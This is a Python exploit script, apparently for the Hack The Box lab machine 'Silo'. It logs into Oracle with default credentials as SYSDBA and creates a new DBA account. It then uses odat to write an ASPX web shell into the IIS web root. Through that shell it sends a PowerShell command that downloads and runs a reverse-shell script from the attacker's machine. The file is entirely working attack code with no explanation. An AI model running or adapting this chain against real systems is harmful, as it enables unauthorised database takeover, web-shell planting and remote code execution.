#!/usr/bin/python3
import sys,os,requests,re,time
import cx_Oracle
import subprocess
import pdb
from pwn import *

def session_oracle():
    session = cx_Oracle.connect("scott","tiger","10.129.1.168:1521/XE",mode=cx_Oracle.SYSDBA)
    
    cursor = session.cursor()
    cursor.execute("CREATE USER cxdxnt IDENTIFIED BY cxdxnt#")
    cursor.execute("GRANT CONNECT,RESOURCE,DBA TO cxdxnt")
    
    p1 = log.progress("Loading")
    time.sleep(2)
    p1.status("Finish")
    
    cursor.close()
    session.close()
def exploit():
    subprocess.call('odat dbmsxslprocessor -s 10.129.1.168 -d XE -U cxdxnt -P cxdxnt# --putFile "c:\\inetpub\\wwwroot" "cmd.aspx" "/home/cxdxnt/Desktop/HTB-VIP/silo/content/cmd.aspx"',shell=True)
    
    main_url = 'http://silo.htb/cmd.aspx'
    s = requests.session()
    response = s.get(main_url)
    ViewState = re.findall(r'__VIEWSTATE" value="(.*?)"',response.text)[0]
    EventValidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"',response.text)[0]
    ViewStateGenerator = re.findall(r'__VIEWSTATEGENERATOR" value="(.*?)"',response.text)[0]
    ExecuteCommandAttack = "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.102/Invoke-PowerShellTcp.ps1')"
    #pdb.set_trace()
    data_post = {
        '__VIEWSTATE' : ViewState,
        '__VIEWSTATEGENERATOR':ViewStateGenerator,
        '__EVENTVALIDATION':EventValidation,
        'txtArg':ExecuteCommandAttack,
        'testing':'excute'
        }
    s.post(main_url,data=data_post)
if __name__ == '__main__' :
    session_oracle()
    exploit()
